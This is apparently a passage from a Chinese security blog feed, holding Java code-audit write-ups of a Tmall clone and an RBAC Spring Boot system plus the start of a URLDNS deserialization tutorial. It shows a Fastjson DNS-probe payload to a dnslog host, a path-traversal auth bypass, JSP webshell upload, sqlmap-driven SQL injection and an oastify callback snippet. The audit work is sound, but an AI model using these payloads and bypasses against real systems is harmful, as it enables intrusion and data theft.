<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;java.net.Inet4Address&quot;,&quot;val&quot;:&quot;cdm2bs.dnslog.cn&quot;&#125; </span><br></pre></td></tr></table></figure>

<p>点击发送数据包后，访问NDSLog地址，点击 Refresh Record ，可以看到获取到回显信息，成功触发了Fastjson漏洞</p>
<h1 id="单点漏洞"><a href="#单点漏洞" class="headerlink" title="单点漏洞"></a>单点漏洞</h1><h2 id="鉴权绕过"><a href="#鉴权绕过" class="headerlink" title="鉴权绕过"></a>鉴权绕过</h2><p>在pom.xml文件中没有搜索到<strong>jwt</strong>和<strong>shiro</strong>关键字,接着去看它的目录结构是否存在<strong>filter</strong>或<strong>Interceptor</strong></p>
<p><img src="/./images/java%E5%AE%A1%E8%AE%A1/Tmall%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20241130224225159.png" alt="image-20241130224225159"></p>
<p>if判断包含&#x2F;admin&#x2F;login与&#x2F;admin&#x2F;account吗,包含则放行</p>
<p>getRequestURI().contains代表获取他的路径并且判断里面是否包含</p>
<p>如果是getRequestURI()与getRequestURL()获取路径可以绕过</p>
<p>getServletPath()方法是绕过不了</p>
<p>我们通过&#x2F;admin&#x2F;login&#x2F;..&#x2F;xxx即可绕过鉴权</p>
<p><img src="/./images/java%E5%AE%A1%E8%AE%A1/Tmall%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20241130224859730.png" alt="image-20241130224859730"></p>
<p><img src="/./images/java%E5%AE%A1%E8%AE%A1/Tmall%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20241130225032858.png" alt="image-20241130225032858"></p>
<h2 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h2><p>因为运用了mybatis所以全局搜索关键词<code>$&#123;</code></p>
<p><img src="/./images/java%E5%AE%A1%E8%AE%A1/Tmall%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20241130225219665.png" alt="image-20241130225219665"></p>
<p>通过代码我们跟踪到工具类 OrderUtil.java</p>
<p><img src="/./images/java%E5%AE%A1%E8%AE%A1/Tmall%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20241130225807222.png" alt="image-20241130225807222"></p>
<p>第一个构造函数没有被调用,查看第二个构造函数</p>
<p><img src="/./images/java%E5%AE%A1%E8%AE%A1/Tmall%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20241130225959078.png" alt="image-20241130225959078"></p>
<p>查看第一个参数的调用.发现它是可控,并且是String类型</p>
<p><img src="/./images/java%E5%AE%A1%E8%AE%A1/Tmall%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20241130230030890.png" alt="image-20241130230030890"></p>
<p>定位到它的路由抓包,放入sqlmap即可出</p>
<p><img src="/./images/java%E5%AE%A1%E8%AE%A1/Tmall%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20241130230131148.png" alt="image-20241130230131148"></p>
<h2 id="前台文件上传"><a href="#前台文件上传" class="headerlink" title="前台文件上传"></a>前台文件上传</h2><p>后台也有同样功能,但是我们选择危害严重的</p>
<p>上传文件的功能一般在头像上传处</p>
<p><img src="/./images/java%E5%AE%A1%E8%AE%A1/Tmall%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20241130230321759.png" alt="image-20241130230321759"></p>
<p><img src="/./images/java%E5%AE%A1%E8%AE%A1/Tmall%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20241130230404362.png" alt="image-20241130230404362"></p>
<p>定位到代码中,发现没有对文件名与内容进行检测，获取文件名然后进行uuid编码返回，保存路径也写了,并且引入了jsp依赖</p>
<p><img src="/./images/java%E5%AE%A1%E8%AE%A1/Tmall%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20241130230438478.png" alt="image-20241130230438478"></p>
<p><img src="/./images/java%E5%AE%A1%E8%AE%A1/Tmall%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20241130230551212.png" alt="image-20241130230551212"></p>
<p>直接上传jsp马,然后连接</p>
<p><img src="/./images/java%E5%AE%A1%E8%AE%A1/Tmall%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20241130230910125.png" alt="image-20241130230910125"></p>
<p>文件保存路径在代码中有，拼接上即可</p>
<p>res&#x2F;images&#x2F;item&#x2F;userProfilePicture&#x2F;</p>
<p><img src="/./images/java%E5%AE%A1%E8%AE%A1/Tmall%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20241130231141587.png" alt="image-20241130231141587"></p>
<h2 id="XSS漏洞"><a href="#XSS漏洞" class="headerlink" title="XSS漏洞"></a>XSS漏洞</h2><p>它的代码没有任何过滤了xss漏洞的代码,所以应该全局都存在,xss在黑盒测试简单,我们见框就插</p>
<p><img src="/./images/java%E5%AE%A1%E8%AE%A1/Tmall%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20241130231445104.png" alt="image-20241130231445104"></p>
]]></content>
      <categories>
        <category>代码审计</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>代码审计</tag>
      </tags>
  </entry>
  <entry>
    <title>RBAC代码审计</title>
    <url>/2024/05/26/RBAC%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</url>
    <content><![CDATA[<h1 id="组件漏洞"><a href="#组件漏洞" class="headerlink" title="组件漏洞"></a>组件漏洞</h1><p>首先查看pom.xml文件,查看运用了哪些组件,并且查询是否有漏洞</p>
<table>
<thead>
<tr>
<th>组件名称</th>
<th>组件版本</th>
</tr>
</thead>
<tbody><tr>
<td>Sping boot</td>
<td>2.3.1</td>
</tr>
<tr>
<td>Spring security</td>
<td>5.3.3</td>
</tr>
<tr>
<td>actuator</td>
<td>2.31</td>
</tr>
<tr>
<td>fastjson</td>
<td>1.2.56</td>
</tr>
<tr>
<td>thymeleaf</td>
<td>3.0.11</td>
</tr>
<tr>
<td>mybatis</td>
<td>2.1.2</td>
</tr>
<tr>
<td>swagger2</td>
<td>2.9.2</td>
</tr>
<tr>
<td>druid</td>
<td>1.1.21</td>
</tr>
<tr>
<td>easy-captcha</td>
<td>1.6.2</td>
</tr>
<tr>
<td>oshi-core</td>
<td>4.4.2</td>
</tr>
<tr>
<td>pagehelper</td>
<td>1.2.13</td>
</tr>
<tr>
<td>hutool</td>
<td>5.1.4</td>
</tr>
</tbody></table>
<h2 id="actuator未授权漏洞-存在"><a href="#actuator未授权漏洞-存在" class="headerlink" title="actuator未授权漏洞(存在)"></a>actuator未授权漏洞(存在)</h2><p>actuator最常见的漏洞就是存在未授权,因为网站为spring boot2.x,所以我们在网站路径后拼接&#x2F;actuator或者源代码搜索endpoints</p>
<p>发现开放了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">info, health, beans, env, metrics</span><br></pre></td></tr></table></figure>

<h2 id="fastjson反序列化-不存在"><a href="#fastjson反序列化-不存在" class="headerlink" title="fastjson反序列化(不存在)"></a>fastjson反序列化(不存在)</h2><p>这里的fastjson版本是 1.2.56,在mvn官方网址查看发现这个版本是存在漏洞,但是在搜索调用方法</p>
<p>JSON.toJSONString()</p>
<p>JSON.parseObject()</p>
<p>JSON.parse()</p>
<p>没有使用,虽然调用了fastjson但是并没有调用</p>
<h2 id="thymeleaf模板注入-不存在"><a href="#thymeleaf模板注入-不存在" class="headerlink" title="thymeleaf模板注入(不存在)"></a>thymeleaf模板注入(不存在)</h2><p>thymeleaf的版本是3.0.11是存在模板注入的,但是这里都运用了注解@ResponseBody,不经过模板去渲染,直接以json与xml返回到响应</p>
<h2 id="Mybatis-不存在"><a href="#Mybatis-不存在" class="headerlink" title="Mybatis(不存在)"></a>Mybatis(不存在)</h2><h2 id="swagger2未授权-存在"><a href="#swagger2未授权-存在" class="headerlink" title="swagger2未授权(存在)"></a>swagger2未授权(存在)</h2><p>swagger2也大多数为未授权漏洞,里面可能存在啥敏感信息</p>
<p>但是这里没啥用</p>
<h2 id="Druid爆破密码-存在"><a href="#Druid爆破密码-存在" class="headerlink" title="Druid爆破密码(存在)"></a>Druid爆破密码(存在)</h2><p>Druid要么管理员配置不当未授权访问要么爆破账号密码,这是网上最常见的漏洞了,因为Druid的页面没有验证码校验,可以爆破成功</p>
<h1 id="单点漏洞"><a href="#单点漏洞" class="headerlink" title="单点漏洞"></a>单点漏洞</h1><h2 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h2><p>因为它是使用mybatis定义sql,所以我们在mapper的xml文件中查看是否有${来直接拼接sql语句全局搜索</p>
<h3 id="UserController-java存在注入漏洞"><a href="#UserController-java存在注入漏洞" class="headerlink" title="UserController.java存在注入漏洞"></a>UserController.java存在注入漏洞</h3><p><img src="/images/java%E5%AE%A1%E8%AE%A1/RBAC%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20241126184607210.png" alt="image-20241126184607210"></p>
<p>这两个是一个地方,差不多一样的</p>
<p>从mapper层到dao层</p>
<p><img src="/./images/java%E5%AE%A1%E8%AE%A1/RBAC%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20241126184743310.png" alt="image-20241126184743310"></p>
<p>dao层到他的实现类UserServiceImpl</p>
<p>从getAllUsersByPage方法跟踪到controller层</p>
<p><img src="/./images/java%E5%AE%A1%E8%AE%A1/RBAC%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20241126185017711.png" alt="image-20241126185017711"></p>
<p>看到查询用户,跟踪路由到&#x2F;api&#x2F;user&#x2F;index,打开网站抓包</p>
<p><img src="/./images/java%E5%AE%A1%E8%AE%A1/RBAC%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20241126185255744.png" alt="image-20241126185255744"></p>
<p>发现nickName与userName参数,不知道为什么延时注入测试不出来,直接上sqlmap可以跑出来</p>
<p>userName可以出来,那么nickName也可以出来</p>
<p><img src="/./images/java%E5%AE%A1%E8%AE%A1/RBAC%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20241126190458097.png" alt="image-20241126190458097"></p>
<h3 id="DictController-java存在注入漏洞"><a href="#DictController-java存在注入漏洞" class="headerlink" title="DictController.java存在注入漏洞"></a>DictController.java存在注入漏洞</h3><p><img src="/./images/java%E5%AE%A1%E8%AE%A1/RBAC%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20241126194149854.png" alt="image-20241126194149854"></p>
<p>还是与上面的步骤一样从mapper层到dao层再到实现类再到controller层</p>
<p>拼接路由,进行抓包,给sqlmap</p>
<p><img src="/./images/java%E5%AE%A1%E8%AE%A1/RBAC%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20241126194343803.png" alt="image-20241126194343803"></p>
<h3 id="DeptController-java存在注入漏洞"><a href="#DeptController-java存在注入漏洞" class="headerlink" title="DeptController.java存在注入漏洞"></a>DeptController.java存在注入漏洞</h3><p><img src="/./images/java%E5%AE%A1%E8%AE%A1/RBAC%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20241126200025504.png" alt="image-20241126200025504"></p>
<p>这个流程与上面一样但是我们在抓包的时候发现没有ancestors参数</p>
<p><img src="/./images/java%E5%AE%A1%E8%AE%A1/RBAC%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20241126200300288.png" alt="image-20241126200300288"></p>
<p>获取的dept类中deptID,并且这个deptID是从数据库查到并给他的,那这个deptID不可控,可是我们如果找到一个地方他会更新deptId值或者插入deptId值是不是也变成可控的造成注入,所以我们找有没有update或者insert语句去更新deptId</p>
<p>并且我们要在DeptMapper.xml因为我们要连接DeptController.java</p>
<p><strong>第一个update</strong></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">update</span> <span class="attr">id</span>=<span class="string">&quot;updateDeptChildren&quot;</span> <span class="attr">parameterType</span>=<span class="string">&quot;java.util.List&quot;</span>&gt;</span></span><br><span class="line">        update my_dept set ancestors =</span><br><span class="line">        <span class="tag">&lt;<span class="name">foreach</span> <span class="attr">collection</span>=<span class="string">&quot;depts&quot;</span> <span class="attr">item</span>=<span class="string">&quot;item&quot;</span> <span class="attr">index</span>=<span class="string">&quot;index&quot;</span></span></span><br><span class="line"><span class="tag">                 <span class="attr">separator</span>=<span class="string">&quot; &quot;</span> <span class="attr">open</span>=<span class="string">&quot;case dept_id&quot;</span> <span class="attr">close</span>=<span class="string">&quot;end&quot;</span>&gt;</span></span><br><span class="line">            when #&#123;item.id&#125; then #&#123;item.ancestors&#125;</span><br><span class="line">        <span class="tag">&lt;/<span class="name">foreach</span>&gt;</span></span><br><span class="line">        where id in</span><br><span class="line">        <span class="tag">&lt;<span class="name">foreach</span> <span class="attr">collection</span>=<span class="string">&quot;depts&quot;</span> <span class="attr">item</span>=<span class="string">&quot;item&quot;</span> <span class="attr">index</span>=<span class="string">&quot;index&quot;</span></span></span><br><span class="line"><span class="tag">                 <span class="attr">separator</span>=<span class="string">&quot;,&quot;</span> <span class="attr">open</span>=<span class="string">&quot;(&quot;</span> <span class="attr">close</span>=<span class="string">&quot;)&quot;</span>&gt;</span></span><br><span class="line">            #&#123;item.id&#125;</span><br><span class="line">        <span class="tag">&lt;/<span class="name">foreach</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">update</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>去追踪到实现类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">updateDeptChildren</span><span class="params">(Integer id, String newAncestors, String oldAncestors)</span></span><br><span class="line">    &#123;</span><br><span class="line">        List&lt;MyDept&gt; children = deptDao.selectChildrenDeptById(id);</span><br><span class="line">        <span class="keyword">for</span> (MyDept child : children)</span><br><span class="line">        &#123;</span><br><span class="line">            child.setAncestors(child.getAncestors().replace(oldAncestors, newAncestors));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (children.size() &gt; <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            deptDao.updateDeptChildren(children);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//将新的Ancestors换到旧的Ancestors</span></span><br></pre></td></tr></table></figure>

<p>再往上跟newAncestors</p>
<p>他必须走到if判断里面,如果走到if判断里面那么newAncestors内容不可控</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">updateDept</span><span class="params">(MyDept dept)</span> &#123;</span><br><span class="line">        <span class="type">MyDept</span> <span class="variable">parentInfo</span> <span class="operator">=</span> deptDao.selectDeptById(dept.getParentId());</span><br><span class="line">        <span class="type">MyDept</span> <span class="variable">oldInfo</span> <span class="operator">=</span> selectDeptById(dept.getDeptId());</span><br><span class="line">        <span class="keyword">if</span>(ObjectUtil.isNotEmpty(parentInfo) &amp;&amp;ObjectUtil.isNotEmpty(oldInfo))&#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">newAncestors</span> <span class="operator">=</span> parentInfo.getAncestors() + <span class="string">&quot;,&quot;</span> + parentInfo.getDeptId();</span><br><span class="line">            <span class="type">String</span> <span class="variable">oldAncestors</span> <span class="operator">=</span> oldInfo.getAncestors();</span><br><span class="line">            dept.setAncestors(newAncestors);</span><br><span class="line">            updateDeptChildren(dept.getDeptId(), newAncestors, oldAncestors);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> <span class="variable">result</span> <span class="operator">=</span>deptDao.updateDept(dept);</span><br><span class="line">        <span class="keyword">if</span> (UserConstants.DEPT_NORMAL.equals(dept.getStatus().toString()))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// 如果该部门是启用状态，则启用该部门的所有上级部门</span></span><br><span class="line">            updateParentDeptStatus(dept);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//String newAncestors = parentInfo.getAncestors() + &quot;,&quot; + parentInfo.getDeptId();</span></span><br><span class="line"><span class="comment">//即即&#123;上级部门ancestors,上级部门id&#125;</span></span><br><span class="line"><span class="comment">//内容不可控,放弃</span></span><br></pre></td></tr></table></figure>

<p><strong>第二个update</strong></p>
<p><img src="/./images/java%E5%AE%A1%E8%AE%A1/RBAC%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20241126202151422.png" alt="image-20241126202151422"></p>
<p>追踪到实现类</p>
<p><img src="/./images/java%E5%AE%A1%E8%AE%A1/RBAC%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20241126202209768.png" alt="image-20241126202209768"></p>
<p>如果有上级部门和dept对象信息都不为空。就进入if判断,我们不能进入到if判断里面,因为进入到if判断里面</p>
<p>newAncestors的值我们就不可控</p>
<p>所以我们得不能有上级部门并且dept对象信息为空</p>
<p>但是我们dept对象信息里面要带有恶意的ancestors参数所以我们必须不为空,那我们就要保证我们传入的dept对象不能有上级部门,我们往上继续追踪</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@PutMapping</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="meta">@ApiOperation(value = &quot;修改部门&quot;)</span></span><br><span class="line">    <span class="meta">@PreAuthorize(&quot;hasAnyAuthority(&#x27;dept:edit&#x27;)&quot;)</span></span><br><span class="line">    <span class="meta">@MyLog(&quot;修改部门&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> Result <span class="title function_">updateMenu</span><span class="params">(<span class="meta">@RequestBody</span> MyDept dept)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (UserConstants.DEPT_NAME_NOT_UNIQUE.equals( deptService.checkDeptNameUnique(dept))) &#123;</span><br><span class="line">            <span class="keyword">return</span> Result.error().message(<span class="string">&quot;更新岗位&#x27;&quot;</span> + dept.getDeptName() + <span class="string">&quot;&#x27;失败，岗位名称已存在&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (dept.getParentId().equals(dept.getDeptId()))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> Result.error().message(<span class="string">&quot;修改部门&#x27;&quot;</span> + dept.getDeptName() + <span class="string">&quot;&#x27;失败，上级部门不能是自己&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span> (dept.getStatus().toString().equals(UserConstants.DEPT_DISABLE)</span><br><span class="line">                &amp;&amp; deptService.selectNormalChildrenDeptById(dept.getDeptId()) &gt; <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> Result.error().message(<span class="string">&quot;该部门包含未停用的子部门！&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> deptService.updateDept(dept);</span><br><span class="line">        <span class="keyword">return</span> Result.judge(i,<span class="string">&quot;修改&quot;</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>他的dept对象是我们用户传入的,那我们拼接路由抓包一个没有上级目录的dept对象中添加一个ancestors参数是不是就可以产生注入了</p>
<p>他是一个输入流中参数不可控,但是另外一个输入流中可以控制相同地方的参数,从而控制参数进行攻击</p>
<p><strong>第三个update</strong></p>
<p><img src="/./images/java%E5%AE%A1%E8%AE%A1/RBAC%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20241126204109242.png" alt="image-20241126204109242"></p>
<p>与ancestors参数毫无关联</p>
<h2 id="XSS漏洞"><a href="#XSS漏洞" class="headerlink" title="XSS漏洞"></a>XSS漏洞</h2><p>网站中没有关于XSS的过滤器或者防护代码,基本全站都有xss</p>
<h2 id="图形验证码"><a href="#图形验证码" class="headerlink" title="图形验证码"></a>图形验证码</h2><p>全局搜captcha或者直接找filter过滤器</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.codermy.myspringsecurityplus.security.filter;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> cn.hutool.core.util.StrUtil;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.codermy.myspringsecurityplus.common.utils.Result;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Component;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.filter.OncePerRequestFilter;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.FilterChain;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpSession;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">VerifyCodeFilter</span> <span class="keyword">extends</span> <span class="title class_">OncePerRequestFilter</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="type">String</span> <span class="variable">defaultFilterProcessUrl</span> <span class="operator">=</span> <span class="string">&quot;/login&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">String</span> <span class="variable">method</span> <span class="operator">=</span> <span class="string">&quot;POST&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doFilterInternal</span><span class="params">(HttpServletRequest request, HttpServletResponse response, FilterChain chain)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        <span class="keyword">if</span> (method.equalsIgnoreCase(request.getMethod()) &amp;&amp; defaultFilterProcessUrl.equals(request.getServletPath())) &#123;</span><br><span class="line">            <span class="comment">// 登录请求校验验证码，非登录请求不用校验</span></span><br><span class="line">            <span class="type">HttpSession</span> <span class="variable">session</span> <span class="operator">=</span> request.getSession();</span><br><span class="line">            <span class="type">String</span> <span class="variable">requestCaptcha</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;captcha&quot;</span>);</span><br><span class="line">            <span class="comment">//验证码的信息存放在seesion种，具体看EasyCaptcha官方解释</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">genCaptcha</span> <span class="operator">=</span> (String) request.getSession().getAttribute(<span class="string">&quot;captcha&quot;</span>);</span><br><span class="line">            response.setContentType(<span class="string">&quot;application/json;charset=UTF-8&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (StrUtil.isEmpty(requestCaptcha))&#123;</span><br><span class="line">                <span class="comment">//删除缓存里的验证码信息</span></span><br><span class="line">                session.removeAttribute(<span class="string">&quot;captcha&quot;</span>);</span><br><span class="line">                response.getWriter().write(JSON.toJSONString(Result.error().message(<span class="string">&quot;验证码不能为空!&quot;</span>)));</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line"><span class="comment">/*            if (StrUtil.isEmpty(genCaptcha))&#123;</span></span><br><span class="line"><span class="comment">                response.getWriter().write(JSON.toJSONString(Result.error().message(&quot;验证码已失效!&quot;)));</span></span><br><span class="line"><span class="comment">                return;</span></span><br><span class="line"><span class="comment">            &#125;</span></span><br><span class="line"><span class="comment">            if (!StrUtil.equalsIgnoreCase(genCaptcha,requestCaptcha))&#123;</span></span><br><span class="line"><span class="comment">                session.removeAttribute(&quot;captcha&quot;);</span></span><br><span class="line"><span class="comment">                response.getWriter().write(JSON.toJSONString(Result.error().message(&quot;验证码错误!&quot;)));</span></span><br><span class="line"><span class="comment">                return;</span></span><br><span class="line"><span class="comment">            &#125;*/</span></span><br><span class="line">        &#125;</span><br><span class="line">        chain.doFilter(request, response);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>他将验证码失效,验证码错误都注释了失效了,所以可以无视验证码,造成账号密码爆破</p>
<h2 id="越权漏洞"><a href="#越权漏洞" class="headerlink" title="越权漏洞"></a>越权漏洞</h2><p>越权漏洞适合黑盒测试</p>
<p>在后台代码中只传入userid进行操作</p>
<p>只要在数据包中存在userid就存在越权</p>
<p>删除用户,用户添加,部门删除都存在越权</p>
]]></content>
      <categories>
        <category>代码审计</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>代码审计</tag>
      </tags>
  </entry>
  <entry>
    <title>Hello World</title>
    <url>/2024/05/24/hello-world/</url>
    <content><![CDATA[<p>Welcome to <a class="link" href="https://hexo.io/">Hexo<i class="fas fa-external-link-alt"></i></a>! This is your very first post. Check <a class="link" href="https://hexo.io/docs/">documentation<i class="fas fa-external-link-alt"></i></a> for more info. If you get any problems when using Hexo, you can find the answer in <a class="link" href="https://hexo.io/docs/troubleshooting.html">troubleshooting<i class="fas fa-external-link-alt"></i></a> or you can ask me on <a class="link" href="https://github.com/hexojs/hexo/issues">GitHub<i class="fas fa-external-link-alt"></i></a>.</p>
<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>

<p>More info: <a class="link" href="https://hexo.io/docs/writing.html">Writing<i class="fas fa-external-link-alt"></i></a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>

<p>More info: <a class="link" href="https://hexo.io/docs/server.html">Server<i class="fas fa-external-link-alt"></i></a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>

<p>More info: <a class="link" href="https://hexo.io/docs/generating.html">Generating<i class="fas fa-external-link-alt"></i></a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>

<p>More info: <a class="link" href="https://hexo.io/docs/one-command-deployment.html">Deployment<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link" href="https://drun1baby.top/2023/12/07/Jackson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E4%B8%89%EF%BC%89CVE-2017-17485/calc.png">calc.png (1463×883) (drun1baby.top)<i class="fas fa-external-link-alt"></i></a></p>
]]></content>
  </entry>
  <entry>
    <title>URLDNS链</title>
    <url>/2024/06/03/URLDNS%E9%93%BE/</url>
    <content><![CDATA[<h1 id="java反序列化实现条件"><a href="#java反序列化实现条件" class="headerlink" title="java反序列化实现条件"></a>java反序列化实现条件</h1><p>1、继承 <strong>Serializable</strong></p>
<p>2、入口类<strong>source</strong> （重写 readObject 调用常见的函数；参数类型宽泛，比如可以传入一个类作为参数；最好 jdk 自带）</p>
<p>3、调用链 <strong>gadget</strong> <strong>chain</strong> 相同名称、相同类型</p>
<p>4、执行类 <strong>sink</strong> （RCE SSRF 写文件等等）比如 exec 这种函数</p>
<h1 id="URLDNS链"><a href="#URLDNS链" class="headerlink" title="URLDNS链"></a>URLDNS链</h1><p><strong>URLDNS</strong>链是Java安全中比较简单的一条利用链，无需使用任何第三方库，全依靠Java内置的一些类实现，但无法进行命令执行，只能实现对URl的访问探测（发起DNS请求），并且不限制Java版本，可以用于检测是否存在反序列化漏洞</p>
<h2 id="URLDNS链调用过程"><a href="#URLDNS链调用过程" class="headerlink" title="URLDNS链调用过程"></a>URLDNS链调用过程</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">HashMap.readObject()</span><br><span class="line">  </span><br><span class="line">  HashMap.putVal()</span><br><span class="line">    </span><br><span class="line">    HashMap.hash()</span><br><span class="line">      </span><br><span class="line">       URL.hashCode()</span><br></pre></td></tr></table></figure>

<h2 id="测试DNS请求"><a href="#测试DNS请求" class="headerlink" title="测试DNS请求"></a>测试DNS请求</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.net.MalformedURLException;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DnsTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> MalformedURLException &#123;</span><br><span class="line">        HashMap&lt;URL, Integer&gt; hashmap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;URL, Integer&gt;();</span><br><span class="line">        URL url= <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://5w27pcihu5gwk0r7oc39drigo7uzip6e.oastify.com&quot;</span>);</span><br><span class="line">        hashmap.put(url,<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span 